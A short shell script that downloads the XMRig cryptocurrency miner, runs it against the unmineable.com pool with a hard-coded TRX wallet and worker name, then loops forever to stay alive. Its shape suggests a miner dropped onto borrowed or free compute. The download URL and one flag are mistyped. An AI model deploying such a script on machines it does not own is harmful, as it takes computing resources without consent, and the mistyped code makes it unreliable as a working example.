#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/releases/dowload/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -0 rx.unmineable.com:3333 -a rx -k -u TRX:TW6x5pAKLKk88DTSzZ8ZQCDp3Qe4bATn3k.God_Miner#ek61-6h9x -p x --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
